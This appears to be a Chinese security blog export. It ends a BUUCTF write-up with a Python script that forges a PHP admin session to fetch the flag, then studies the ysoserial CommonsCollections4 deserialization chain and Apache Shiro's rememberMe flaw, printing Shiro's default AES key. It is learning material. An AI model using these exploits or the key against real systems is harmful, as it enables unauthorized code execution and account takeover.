<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://e2cec884-8829-4092-a14e-072d64de4f5f.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># login as sess_</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    sess.post(URL + <span class="string">&#x27;login.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;sess_&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a crafted note</span></span><br><span class="line">    sess.post(URL + <span class="string">&#x27;add.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;|N;admin|b:1;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a fake session</span></span><br><span class="line">    r = sess.get(URL + <span class="string">&#x27;export.php?type=.&#x27;</span>).headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line">    sessid = re.findall(<span class="string">r&#x27;sess_([0-9a-z-]+)&#x27;</span>, r)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(sessid)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    r = requests.get(URL + <span class="string">&#x27;?page=flag&#x27;</span>, cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">    &#125;).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag = re.findall(<span class="string">r&#x27;flag\&#123;.+\&#125;&#x27;</span>, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>é›†è®­</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuåˆ·é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaåˆæ­¥å­¦ä¹ â…¤</title>
    <url>/2022/06/29/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A4/</url>
    <content><![CDATA[<blockquote>
<p>CC4ã€shiroâ€¦â€¦</p>
</blockquote>
<span id="more"></span>

<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>expï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections4</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Queue</span>&lt;<span class="title">Object</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">      ConstantTransformer constant = <span class="keyword">new</span> ConstantTransformer(String.class);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// mock method name until armed</span></span><br><span class="line">      Class[] paramTypes = <span class="keyword">new</span> Class[] &#123; String.class &#125;;</span><br><span class="line">      Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line">      InstantiateTransformer instantiate = <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">            paramTypes, args);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// grab defensively copied arrays</span></span><br><span class="line">      paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">      args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line"></span><br><span class="line">      ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// create queue with numbers</span></span><br><span class="line">      PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> TransformingComparator(chain));</span><br><span class="line">      queue.add(<span class="number">1</span>);</span><br><span class="line">      queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// swap in values to arm</span></span><br><span class="line">      Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">      paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">      args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> queue;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections4.class, args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»£ç å¹¶ä¸éš¾ï¼Œè·‘äº†ä¸€éç¨‹åºä¹‹åå¯ä»¥å¼¹å‡ºè®¡ç®—å™¨ï¼Œé‚£ä¹ˆç°åœ¨å°±æ¥åˆ†æä¸€ä¸‹å§</p>
<h4 id="è°ƒç”¨æ ˆï¼š"><a href="#è°ƒç”¨æ ˆï¼š" class="headerlink" title="è°ƒç”¨æ ˆï¼š"></a>è°ƒç”¨æ ˆï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;:101, XMLFilterImpl (org.xml.sax.helpers)</span><br><span class="line">&lt;init&gt;:62, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">transform:112, ChainedTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:81, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">deserialize:27, Deserializer (ysoserial)</span><br><span class="line">deserialize:22, Deserializer (ysoserial)</span><br><span class="line">run:38, PayloadRunner (ysoserial.payloads.util)</span><br><span class="line">main:62, CommonsCollections4 (ysoserial.payloads)</span><br></pre></td></tr></table></figure>

<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>ä¼˜å…ˆé˜Ÿåˆ—ç±»</p>
<p>ä¸»è¦æ˜¯å¯¹é˜Ÿåˆ—è¿›è¡Œæ“ä½œï¼Œå¯ä»¥åºåˆ—åŒ–</p>
<h4 id="æµ…æ"><a href="#æµ…æ" class="headerlink" title="æµ…æ"></a>æµ…æ</h4><p>å› ä¸ºæœ€å¤–å±‚å¥—çš„å°±æ˜¯<code>PriorityQueue</code>ï¼Œé‚£å°±å…ˆå»çœ‹ä¸€ä¸‹<code>PriorityQueue#readObject</code>ï¼Œåœ¨æœ€åä¼šè°ƒç”¨åˆ°<code>heapify()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>heapify()</code>å½¢æˆæœ€å¤§å †ï¼Œè°ƒç”¨åˆ°<code>siftDownUsingComparator</code>çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°<code>comparator.compare(x, (E) c)</code>ä¹Ÿå°±æ˜¯<code>TransformingComparator#compare</code>å‚æ•°éƒ½ä¸º1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>TransformingComparator#compare</code>ï¼Œè€Œåœ¨å®ä¾‹åŒ–çš„æ—¶å€™<code>this.transformer</code>çš„å€¼ä¸º<code>ChainedTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œ<code>ChainedTransformer#transform</code>æ–¹æ³•åˆä¼šè°ƒç”¨åˆ°<code>ConstantTransformer</code>å’Œ<code>InstantiateTransformer</code>çš„<code>transform</code>ï¼Œåé¢çš„ä¹Ÿå’ŒCC3ä¸€æ ·äº†åœ¨<code>InstantiateTransformer#transform</code>ä¸­å°†<code>TrAXFilter</code>å®ä¾‹åŒ–ï¼Œå¹¶ä¸”å°†payloadä½œä¸ºå‚æ•°ä¼ è¿›å»ï¼Œä»è€Œ<code>TrAXFilter</code>åœ¨åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨åˆ°äº†<code>TemplatesImpl#newTransformer</code>ï¼Œè¿™é‡Œå°±å›åˆ°äº†ä¹‹å‰çš„<code>TemplatesImpl</code>è°ƒç”¨é“¾äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i$ = <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">    Transformer&lt;? <span class="keyword">super</span> T, ? extends T&gt; iTransformer = arr$[i$];</span><br><span class="line">    object = iTransformer.transform(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å’ŒCC3çš„åŒºåˆ«"><a href="#å’ŒCC3çš„åŒºåˆ«" class="headerlink" title="å’ŒCC3çš„åŒºåˆ«"></a>å’ŒCC3çš„åŒºåˆ«</h4><blockquote>
<p>Apache Commons Collectionsæ˜¯â¼€ä¸ªè‘—åçš„è¾…åŠ©å¼€å‘åº“ï¼ŒåŒ…å«äº†â¼€äº›Javaä¸­æ²¡æœ‰çš„æ•°æ®ç»“æ„å’Œå’Œè¾…åŠ© â½…æ³•ï¼Œä¸è¿‡éšç€Java 9ä»¥åçš„ç‰ˆæœ¬ä¸­åŸâ½£åº“åŠŸèƒ½çš„ä¸°å¯Œï¼Œä»¥åŠååºåˆ—åŒ–æ¼æ´çš„å½±å“ï¼Œå®ƒä¹Ÿåœ¨é€æ¸è¢«å‡çº§ æˆ–æ›¿ä»£ã€‚ åœ¨2015å¹´åº•commons-collectionsååºåˆ—åŒ–åˆ©â½¤é“¾è¢«æå‡ºæ—¶ï¼ŒApache Commons Collectionsæœ‰ä»¥ä¸‹ä¸¤ ä¸ªåˆ†â½€ç‰ˆæœ¬ï¼š </p>
<ul>
<li><p>commons-collections:commons-collections </p>
</li>
<li><p>org.apache.commons:commons-collections4</p>
</li>
</ul>
</blockquote>
<p>CC2å’ŒCC4éƒ½ä¸é€‚ç”¨ä¾èµ–ä¸ºcommons-collections3.2.1çš„ç¯å¢ƒï¼Œä¾èµ–å·²ç»å˜æˆcommons-collections4ï¼ŒåŒºåˆ«ä¸º<code>PriorityQueue</code>ç±»åœ¨commons-collections4ä¸­å¯åºåˆ—åŒ–ï¼Œç”šè‡³å‡ºç°äº†æ›´å¤šå¯åºåˆ—åŒ–çš„<code>Transformer</code></p>
<p>ä½†ä»¥å‰çš„CCé“¾è¿˜æ˜¯èƒ½å¤Ÿç”¨åˆ°ï¼Œä½†æ˜¯éœ€è¦ä¿®æ”¹ï¼Œå°±æ¯”å¦‚CC6å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯<code>LazyMap#decorate</code>æ–¹æ³•æ²¡äº†ç›´æ¥æ¢æˆå¦ä¸€ä¸ªç›¸åŒæ“ä½œçš„æ–¹æ³•å°±å¥½äº†</p>
<h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><h4 id="shiroæ˜¯ä»€ä¹ˆ"><a href="#shiroæ˜¯ä»€ä¹ˆ" class="headerlink" title="shiroæ˜¯ä»€ä¹ˆ"></a>shiroæ˜¯ä»€ä¹ˆ</h4><p>Apache Shiro æ˜¯ Java çš„ä¸€ä¸ªå®‰å…¨æ¡†æ¶ã€‚ç›®å‰ï¼Œä½¿ç”¨ Apache Shiro çš„äººè¶Šæ¥è¶Šå¤šï¼Œå› ä¸ºå®ƒç›¸å½“ç®€å•ï¼Œå¯¹æ¯” Spring Securityï¼Œå¯èƒ½æ²¡æœ‰ Spring Security åšçš„åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯åœ¨å®é™…å·¥ä½œæ—¶å¯èƒ½å¹¶ä¸éœ€è¦é‚£ä¹ˆå¤æ‚çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä½¿ç”¨å°è€Œç®€å•çš„ Shiro å°±è¶³å¤Ÿäº†ã€‚</p>
<p><img src="https://atts.w3cschool.cn/attachments/image/wk/shiro/1.png" alt="img"></p>
<h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†:"></a>æ¼æ´åŸç†:</h4><blockquote>
<p>ä¸ºäº†è®©æµè§ˆå™¨æˆ–æœåŠ¡å™¨é‡ å¯åç”¨æˆ·ä¸ä¸¢å¤±ç™»å½•çŠ¶æ€ï¼ŒShiroæ”¯æŒå°†æŒä¹…åŒ–ä¿¡æ¯åºåˆ—åŒ–å¹¶åŠ å¯†åä¿å­˜åœ¨Cookieçš„rememberMeå­— æ®µä¸­ï¼Œä¸‹æ¬¡è¯»å–æ—¶è¿›è¡Œè§£å¯†å†ååºåˆ—åŒ–ã€‚ä½†æ˜¯åœ¨Shiro 1.2.4ç‰ˆæœ¬ä¹‹å‰å†…ç½®äº†ä¸€ä¸ªé»˜è®¤ä¸”å›ºå®šçš„åŠ å¯† Keyï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ªé€ ä»»æ„çš„rememberMe Cookieï¼Œè¿›è€Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</p>
</blockquote>
<h4 id="CCæ”»å‡»shiro"><a href="#CCæ”»å‡»shiro" class="headerlink" title="CCæ”»å‡»shiro"></a>CCæ”»å‡»shiro</h4><p>ç”¨Pç¥çš„Demoï¼Œç”¨IDEAéƒ¨ç½²</p>
<p>å‘ç°å­˜åœ¨CCä¾èµ–ï¼ˆç”¨äºååºåˆ—åŒ–æ¼æ´</p>
<p><img src="https://img-blog.csdnimg.cn/da574f0e4b5e4cbf8fcaacb517b3b5f8.png" alt="image-20220627173631844"></p>
<p>éƒ¨ç½²å¥½ä¹‹åç™»å½•ï¼Œå¦‚æœç™»å½•æˆåŠŸå¹¶ä¸”å¦‚æœåœ¨ç™»å½•çš„æ—¶å€™é€‰æ‹©äº†<code>rememberme</code>å°±ä¼šäº§ç”Ÿcookieè®°å½•ç”¨æˆ·ä¿¡æ¯ï¼Œä»è€Œå¯¼è‡´äº†ååºåˆ—åŒ–æ¼æ´çš„å‡ºç°ã€‚æ„æ€å³å› ä¸ºshiroåŠ å¯†çš„å¯†é’¥æ˜¯å›ºå®šçš„ï¼Œå¦‚æœæˆ‘ä»¬è·å–åˆ°äº†å¯†é’¥ç„¶åå°†æˆ‘ä»¬çš„payloadè¿›è¡ŒåŠ å¯†ï¼Œæ”¾åˆ°<code>rememberme</code>ä¸Šï¼Œshiroå°±ä¼šå°†æˆ‘ä»¬çš„payloadååºåˆ—åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/61040b07e0b84db7af1e0da7067201db.png" alt="image-20220627192116391"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»˜è®¤å¯†é’¥ï¼š</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure>

<p>åœ¨ååºåˆ—åŒ–ä¹‹å‰æˆ‘ä»¬å¯ä»¥å…ˆå»èµ°ä¸€éä»–æ˜¯æ€ä¹ˆè¿›è¡ŒåŠ å¯†å¹¶æ”¾åˆ°Cookieä¸Šçš„</p>
<h5 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h5><p>å¯ä»¥å…¨å±€æœç´¢ä¸€ä¸‹<code>RememberMe</code>ï¼Œå­˜åœ¨ä¸€ä¸ªæ¥å£ï¼Œè¦å®ç°ç™»é™†æˆåŠŸã€ç™»é™†å¤±è´¥ã€ç™»å‡ºç­‰æ–¹æ³•ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥å»å®ç°è¿™ä¸ªæ¥å£çš„ç±»</p>
<p><code>AbstractRememberMeManager</code>åœ¨ç™»é™†æˆåŠŸçš„æ—¶å€™ä¼šåˆ¤æ–­æ˜¯å¦éœ€è¦<code>Remember</code>ï¼Œè·Ÿè¿›<code>isRememberMe</code>å’Œ<code>rememberIdentity</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.forgetIdentity(subject);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isRememberMe(token)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šæ˜¯ä¼šå»<code>CookieRememberMeManager</code>ï¼Œå› ä¸ºè¿™ä¸ªç±»æ¯•ç«Ÿæ˜¯ä¸ªæŠ½è±¡ç±»æï¼Œç»§ç»­çœ‹ã€‚è¿™é‡Œçš„Tokenå®é™…ä¸Šå°±æ˜¯è®°å½•ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šç”¨æˆ·åã€å¯†ç ä»¥åŠæ˜¯å¦remember</p>
<p><img src="https://img-blog.csdnimg.cn/95a2403ab7744bb184b4e7e23b44c7ec.png" alt="image-20220627195428748"></p>
<p>ç„¶åé€šè¿‡<code>rememberIdentity</code>å°†ç”¨æˆ·ä¿¡æ¯è£…æˆå­—èŠ‚ç ï¼Œå¹¶ä¸”è¿›è¡ŒAESåŠ å¯†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.serialize(principals);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// private CipherService cipherService = new AesCipherService();</span></span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨åŠ å¯†æ–¹æ³•ä¸­ï¼Œæ‰§è¡ŒåŠ å¯†ï¼Œä¸”å¯†é’¥ä¸ºé»˜è®¤çš„<code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractRememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>åŠ å¯†ç»“æŸä¹‹åå°±ä¼šè°ƒç”¨åˆ°<code>CookieRememberMeManager#rememberSerializedIdentity</code>ï¼Œå®ç°å°†cookieè®¾ç½®</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="keyword">byte</span>[] serialized)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            String msg = <span class="string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to set the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">        HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line">        String base64 = Base64.encodeToString(serialized);</span><br><span class="line">        Cookie template = <span class="keyword">this</span>.getCookie();</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> SimpleCookie(template);</span><br><span class="line">        cookie.setValue(base64);</span><br><span class="line">        cookie.saveTo(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h5><p>è¯•ç€ç›´æ¥ç”¨æ— é™åˆ¶çš„CC6 AESåŠ å¯†ä¹‹åæ˜¯å¦å¯ä»¥æ‰“é€š</p>
<p>å‘ç”Ÿäº†æŠ¥é”™ï¼Œè¯´æ˜¯ä¸åŠ è½½<code>Transform</code>è¿™ä¸ªç±»ï¼Œä¼šæŠ¥é”™è¯´æ˜å°±æ˜¯åœ¨ååºåˆ—åŒ–ä¹Ÿå°±æ˜¯è§£ærememberMeçš„æ—¶å€™å‡ºç°äº†é—®é¢˜ï¼Œè¯•ç€æ‰“æ–­ç‚¹çœ‹çœ‹</p>
<p><img src="https://img-blog.csdnimg.cn/30190359151746a5b5392bff812e1be7.png" alt="image-20220627203627520"></p>
<p>å› ä¸ºå„ç§åŸå› ï¼Œcookieæ²¡ä¿®æ”¹æˆåŠŸï¼Œä¹Ÿæ‡’å¾—æœ¬åœ°æŠ“åŒ…äº†ï¼Œé‚£å°±è·Ÿç€Pç¥çš„æ€è·¯æ¥å§</p>
<p>å¼‚å¸¸å…³é”®æ˜¯åœ¨<code>ClassResolvingObjectInputStream</code>ï¼Œå¯ä»¥å‘ç°æŠ¥é”™ä¿¡æ¯å°±æ˜¯ä»è¿™ä¸ªç±»é‡Œå‡ºæ¥çš„ã€‚</p>
<p><code>resolveClass</code>æ–¹æ³•ä¸­å¯¹ç±»çš„åŠ è½½ç”¨åˆ°æ˜¯<code>ClassUtils#forName</code></p>
